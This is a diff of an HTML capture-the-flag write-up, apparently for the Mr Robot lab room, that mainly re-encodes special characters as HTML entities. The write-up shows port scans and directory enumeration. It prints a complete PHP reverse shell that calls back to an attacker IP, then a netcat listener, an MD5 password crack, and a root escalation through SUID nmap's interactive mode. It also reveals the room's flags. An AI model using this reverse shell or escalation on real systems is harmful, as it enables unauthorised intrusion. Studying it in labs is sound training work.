@@ -128,13 +128,13 @@
     --------------------------------------
     Scanning ports like it&#39;s my full-time job. Wait, it is.
 
-    [~] The config file is expected to be at "/root/.rustscan.toml"
-    [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
-    [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. 
+    [&#126;] The config file is expected to be at "/root/.rustscan.toml"
+    [&excl;] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+    [&excl;] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. 
     Open 10.10.240.142:80
     Open 10.10.240.142:443
-    [~] Starting Script(s)
-    [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:31 +03
+    [&#126;] Starting Script(s)
+    [&#126;] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:31 +03
     Initiating Ping Scan at 00:31
     Scanning 10.10.240.142 [4 ports]
     Completed Ping Scan at 00:31, 1.42s elapsed (1 total hosts)
@@ -159,7 +159,7 @@
                 Raw packets sent: 6 (240B) | Rcvd: 128 (29.816KB)
 
     ┌─[root&commat;parrot]─[/home/parrot]
-    └──╼ #nmap -sC -sV -A -Pn -p 80,443 10.10.240.142
+    └──╼ &#35;nmap -sC -sV -A -Pn -p 80,443 10.10.240.142
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:36 +03
     Nmap scan report for 10.10.240.142
     Host is up (0.49s latency).
@@ -265,7 +265,7 @@
             <p>So we see only two ports are open and with this services and the versions we cant do something useful. We keep enumeration on port 80 with gobuster:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root&commat;parrot]─[/home/parrot]
-    └──╼ #gobuster dir -u http://10.10.240.142 -w common.txt -x php,html,txt,old,cgi
+    └──╼ &#35;gobuster dir -u http://10.10.240.142 -w common.txt -x php,html,txt,old,cgi
     ===============================================================
     Gobuster v3.6
     by OJ Reeves (&commat;TheColonial) &amp; Christian Mehlmauer (&commat;firefart)
@@ -518,14 +518,14 @@
     
     set_time_limit (0);
     $VERSION = &quot;1.0&quot;;
-    $ip = &#39;10.17.51.16&#39;;  // CHANGE THIS
-    $port = 1234;       // CHANGE THIS
-    $chunk_size = 1400;
-    $write_a = null;
-    $error_a = null;
-    $shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
-    $daemon = 0;
-    $debug = 0;
+    &#36;ip = &#39;10.17.51.16&#39;;  // CHANGE THIS
+    &#36;port = 1234;       // CHANGE THIS
+    &#36;chunk_size = 1400;
+    &#36;write_a = null;
+    &#36;error_a = null;
+    &#36;shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+    &#36;daemon = 0;
+    &#36;debug = 0;
     
     //
     // Daemonise ourself if possible to avoid zombies later
@@ -537,12 +537,12 @@
         // Fork and have the parent process exit
         $pid = pcntl_fork();
         
-        if ($pid == -1) {
+        if (&#36;pid == -1) {
             printit(&quot;ERROR: Can&#39;t fork&quot;);
             exit(1);
         }
         
-        if ($pid) {
+        if (&#36;pid) {
             exit(0);  // Parent exits
         }
     
@@ -553,7 +553,7 @@
             exit(1);
         }
     
-        $daemon = 1;
+        &#36;daemon = 1;
     } else {
         printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
     }
@@ -569,92 +569,92 @@
     //
     
     // Open reverse connection
-    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
-    if (!$sock) {
-        printit(&quot;$errstr ($errno)&quot;);
+    &#36;sock = fsockopen(&#36;ip, &#36;port, &#36;errno, &#36;errstr, 30);
+    if (&excl;&#36;sock) {
+        printit(&quot;&#36;errstr (&#36;errno)&quot;);
         exit(1);
     }
     
     // Spawn shell process
-    $descriptorspec = array(
+    &#36;descriptorspec = array(
         0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
         1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
         2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
     );
     
-    $process = proc_open($shell, $descriptorspec, $pipes);
+    &#36;process = proc_open(&#36;shell, &#36;descriptorspec, &#36;pipes);
     
-    if (!is_resource($process)) {
+    if (&excl;is_resource(&#36;process)) {
         printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
         exit(1);
     }
     
     // Set everything to non-blocking
     // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
-    stream_set_blocking($pipes[0], 0);
-    stream_set_blocking($pipes[1], 0);
-    stream_set_blocking($pipes[2], 0);
-    stream_set_blocking($sock, 0);
+    stream_set_blocking(&#36;pipes[0], 0);
+    stream_set_blocking(&#36;pipes[1], 0);
+    stream_set_blocking(&#36;pipes[2], 0);
+    stream_set_blocking(&#36;sock, 0);
     
-    printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+    printit(&quot;Successfully opened reverse shell to &#36;ip:&#36;port&quot;);
     
     while (1) {
         // Check for end of TCP connection
-        if (feof($sock)) {
+        if (feof(&#36;sock)) {
             printit(&quot;ERROR: Shell connection terminated&quot;);
             break;
         }
     
         // Check for end of STDOUT
-        if (feof($pipes[1])) {
+        if (feof(&#36;pipes[1])) {
             printit(&quot;ERROR: Shell process terminated&quot;);
             break;
         }
     
         // Wait until a command is end down $sock, or some
         // command output is available on STDOUT or STDERR
-        $read_a = array($sock, $pipes[1], $pipes[2]);
-        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+        &#36;read_a = array(&#36;sock, &#36;pipes[1], &#36;pipes[2]);
+        &#36;num_changed_sockets = stream_select(&#36;read_a, &#36;write_a, &#36;error_a, null);
     
         // If we can read from the TCP socket, send
         // data to process&#39;s STDIN
-        if (in_array($sock, $read_a)) {
-            if ($debug) printit(&quot;SOCK READ&quot;);
-            $input = fread($sock, $chunk_size);
-            if ($debug) printit(&quot;SOCK: $input&quot;);
-            fwrite($pipes[0], $input);
+        if (in_array(&#36;sock, &#36;read_a)) {
+            if (&#36;debug) printit(&quot;SOCK READ&quot;);
+            &#36;input = fread(&#36;sock, &#36;chunk_size);
+            if (&#36;debug) printit(&quot;SOCK: &#36;input&quot;);
+            fwrite(&#36;pipes[0], &#36;input);
         }
     
         // If we can read from the process&#39;s STDOUT
         // send data down tcp connection
-        if (in_array($pipes[1], $read_a)) {
-            if ($debug) printit(&quot;STDOUT READ&quot;);
-            $input = fread($pipes[1], $chunk_size);
-            if ($debug) printit(&quot;STDOUT: $input&quot;);
-            fwrite($sock, $input);
+        if (in_array(&#36;pipes[1], &#36;read_a)) {
+            if (&#36;debug) printit(&quot;STDOUT READ&quot;);
+            &#36;input = fread(&#36;pipes[1], &#36;chunk_size);
+            if (&#36;debug) printit(&quot;STDOUT: &#36;input&quot;);
+            fwrite(&#36;sock, &#36;input);
         }
     
         // If we can read from the process&#39;s STDERR
         // send data down tcp connection
-        if (in_array($pipes[2], $read_a)) {
-            if ($debug) printit(&quot;STDERR READ&quot;);
-            $input = fread($pipes[2], $chunk_size);
-            if ($debug) printit(&quot;STDERR: $input&quot;);
-            fwrite($sock, $input);
+        if (in_array(&#36;pipes[2], &#36;read_a)) {
+            if (&#36;debug) printit(&quot;STDERR READ&quot;);
+            &#36;input = fread(&#36;pipes[2], &#36;chunk_size);
+            if (&#36;debug) printit(&quot;STDERR: &#36;input&quot;);
+            fwrite(&#36;sock, &#36;input);
         }
     }
     
-    fclose($sock);
-    fclose($pipes[0]);
-    fclose($pipes[1]);
-    fclose($pipes[2]);
-    proc_close($process);
+    fclose(&#36;sock);
+    fclose(&#36;pipes[0]);
+    fclose(&#36;pipes[1]);
+    fclose(&#36;pipes[2]);
+    proc_close(&#36;process);
     
     // Like print, but does nothing if we&#39;ve daemonised ourself
     // (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
-    function printit ($string) {
-        if (!$daemon) {
-            print &quot;$string\n&quot;;
+    function printit (&#36;string) {
+        if (&excl;&#36;daemon) {
+            print &quot;&#36;string\n&quot;;
         }
     }
     
@@ -664,16 +664,16 @@
             <p>When we paste this code and click update file we get our reverse shell as user daemon. When we go to the home page we see there is a user named robot. In robot directory there is password.raw-md5 and our second flag key-2-of-3.txt . We cant read key-2-of-3.txt. But we can read  password.raw-md5 . Inside of it there is md5 encoded passsword of user robot. When we decode it in <a href="https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b">https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b</a>  we see password is abcdefghijklmnopqrstuvwxyz . When we login with this password we are in as user robot:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root&commat;parrot]─[/home/parrot]
-    └──╼ #nc -lvnp 1234
+    └──╼ &#35;nc -lvnp 1234
     listening on [any] 1234 ...
     connect to [10.17.51.16] from (UNKNOWN) [10.10.74.164] 50436
-    Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+    Linux linux 3.13.0-55-generic &#35;94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
         10:01:26 up 5 min,  0 users,  load average: 0.02, 0.14, 0.08
     USER     TTY      FROM             LOGIN&commat;   IDLE   JCPU   PCPU WHAT
     uid=1(daemon) gid=1(daemon) groups=1(daemon)
     /bin/sh: 0: can&#39;t access tty; job control turned off
-    $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-    daemon&commat;linux:/$ cd /home/robot
+    &#36; python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+    daemon&commat;linux:/&#36; cd /home/robot
     cd /home/robot
     daemon&commat;linux:/home/robot$ ls -la
     ls -la
@@ -692,12 +692,12 @@
     su robot
     Password: abcdefghijklmnopqrstuvwxyz
     
-    robot&commat;linux:~$ 
+    robot&commat;linux:&#126;&#36; 
             </code></pre></div>
             <p></p>
             <p>After login as user robot we can read  key-2-of-3.txt:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
-    robot&commat;linux:~$ cat key-2-of-3.txt
+    robot&commat;linux:&#126;&#36; cat key-2-of-3.txt
     cat key-2-of-3.txt
     822c73956184f694993bede3eb39f959
             </code></pre></div>
@@ -706,7 +706,7 @@
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre></div>
             <p>And then we see there is something interesting. Nmap runs with root privileges:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
-    robot&commat;linux:~$ find / -perm -u=s -type f 2&gt;/dev/null
+    robot&commat;linux:&#126;&#36; find / -perm -u=s -type f 2&gt;/dev/null
     find / -perm -u=s -type f 2&gt;/dev/null
     /bin/ping
     /bin/umount
@@ -732,23 +732,23 @@
         <div class="photo-container">
             <img src="pics/M8.png" alt="Image 8">
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
-    robot&commat;linux:~$ nmap --interactive
+    robot&commat;linux:&#126;&#36; nmap --interactive
     nmap --interactive
     
     Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
     Welcome to Interactive Mode -- press h &lt;enter&gt; for help
-    nmap&gt; !sh
-    !sh
-    # whoami
+    nmap&gt; &excl;sh
+    &excl;sh
+    &#35; whoami
     whoami
     root
             </code></pre></div>
             <p></p>
             <p>We see it worked. We got a root shell. So we make final moves to finish this room:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
-    #cd /root/
+    &#35;cd /root/
     cd /root/
-    # ls -la
+    &#35; ls -la
     ls -la
     total 32
     drwx------  3 root root 4096 Nov 13  2015 .
@@ -760,7 +760,7 @@
     -r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
     -rw-r--r--  1 root root  140 Feb 20  2014 .profile
     -rw-------  1 root root 1024 Sep 16  2015 .rnd
-    # cat key-3-of-3.txt
+    &#35; cat key-3-of-3.txt
     cat key-3-of-3.txt
     04787ddef27c3dee1ee161b21670b4e4
             </code></pre></div>
